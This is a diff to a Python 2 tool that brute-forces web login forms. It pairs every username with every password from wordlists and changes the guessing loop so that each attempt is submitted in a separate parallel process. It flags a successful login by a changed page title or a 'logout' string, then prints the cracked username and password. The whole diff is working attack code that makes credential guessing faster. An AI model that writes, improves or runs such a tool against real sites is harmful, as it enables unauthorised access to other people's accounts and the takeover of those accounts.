@@ -1,7 +1,9 @@
 #!/usr/bin/env python2
 #Modules
+import time
 import mechanize
 import itertools
+from multiprocessing import Process
 import cookielib
 import sys
 from bs4 import BeautifulSoup
@@ -96,6 +98,12 @@ print '\033[1;97m[>]\033[1;m Usernames loaded: %i'% len(usernames)
 passwords = []
 wordlist_p(passwords)
 print '\033[1;97m[>]\033[1;m Passwords loaded: %i'% + len(passwords)
+
+list=[]
+for uname in usernames:
+	for passwd in passwords:
+		list.append([uname,passwd])
+
 def find(): #Function for finding forms
     form_number = 0
     for f in forms: #Finds all the forms in the webpage
@@ -123,15 +131,15 @@ def find(): #Function for finding forms
                         print '\033[1;33m[!]\033[0m Menu name: ' + name #prints menu name
                         print '\033[1;33m[!]\033[0m Options available: ' + options #prints available options
                         option = raw_input('\033[1;34m[?]\033[0m Please Select an option:>> ') #Gets option from user
-                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
+                        start(username, passwd, menu, option, name, form_number)
                     else:
                         menu = "False" #No menu is present in the form
-                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
+                        start(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                 else:
                     menu = "False" #No menu is present in the form
                     option = "" #Sets option to null
                     name = "" #Sets name to null
-                    brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
+                    start(username, passwd, menu, option, name, form_number)#Calls the bruteforce function
             else:
                 form_number = form_number + 1
                 pass
@@ -139,50 +147,66 @@ def find(): #Function for finding forms
             form_number = form_number + 1
             pass
     print '\033[1;31m[-]\033[0m No forms found'
-def brute(username, passwd, menu, option, name, form_number):
-    progress = 1
-    for uname in usernames:
-        print '\033[1;97m[>]\033[1;m Bruteforcing username: %s'% uname
-        for password in passwords:
+ucount=[]
+def start(username, passwd, menu, option, name, form_number):
+    for uname,password in list:
+    	if uname not in ucount:
+            print '\n\033[1;97m[>]\033[1;m Bruteforcing username: %s'% uname
+            ucount.append(uname)
+            progress=1
             sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'% (progress, len(passwords)))
             sys.stdout.flush()
-            br.open(url)  
-            br.select_form(nr=form_number)
-            br.form[username] = uname
-            br.form[passwd] = password
-            if menu == "False":
-                pass
-            elif menu == "True":
-                br.form[name] = [option]
-            else:
-                pass
-            resp = br.submit()
-            data = resp.read()
-            data_low = data.lower()
-            if 'username or password' in data_low:
-                pass
-            else:
-                soup =  BeautifulSoup(data, 'lxml')
-                i_title = soup.find('title')
-                if i_title == None:
-                    data = data.lower()
-                    if 'logout' in data:
-                        print '\n\033[1;32m[+]\033[0m Valid credentials found: '
-                        print uname
-                        print password
-                        quit()
-                    else:
-                        pass
-                else:
-                    injected = i_title.contents
-                    if original != injected:
-                        print '\n\033[1;32m[+]\033[0m Valid credentials found: '
-                        print '\033[1;32mUsername: \033[0m' + uname
-                        print '\033[1;32mPassword: \033[0m' + password
-                        quit()
-                    else:
-                        pass
-            progress = progress + 1
-    print '\033[1;31m[-]\033[0m Failed to crack login credentials'
+	else:
+            progress=progress+1
+            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'% (progress, len(passwords)))
+            sys.stdout.flush()
+        t=Process(target=brute,args=(username, passwd, menu, option, name, form_number,uname,password,)) #Calls the bruteforce function
+        rthreads.append(t)
+	t.start()
+        time.sleep(0.01)
+    for rthread in rthreads:
+        rthread.join()
+
+    print '\n\033[1;31m[-]\033[0m Failed to crack login credentials'
     quit()
+
+def brute(username, passwd, menu, option, name, form_number,uname,password):
+    br.open(url)  
+    br.select_form(nr=form_number)
+    br.form[username] = uname
+    br.form[passwd] = password
+    if menu == "False":
+        pass
+    elif menu == "True":
+        br.form[name] = [option]
+    else:
+        pass
+    resp = br.submit()
+    data = resp.read()
+    data_low = data.lower()
+    if 'username or password' in data_low:
+        pass
+    else:
+        soup =  BeautifulSoup(data, 'lxml')
+        i_title = soup.find('title')
+        if i_title == None:
+            data = data.lower()
+            if 'logout' in data:
+                print '\n\033[1;32m[+]\033[0m Valid credentials found: '
+                print uname
+                print password
+                quit()
+            else:
+                pass
+        else:
+            injected = i_title.contents
+            if original != injected:
+                print '\n\033[1;32m[+]\033[0m Valid credentials found: '
+                print '\033[1;32mUsername: \033[0m' + uname
+                print '\033[1;32mPassword: \033[0m' + password
+                quit()
+            else:
+                pass
+rthreads=[]
 find()
+
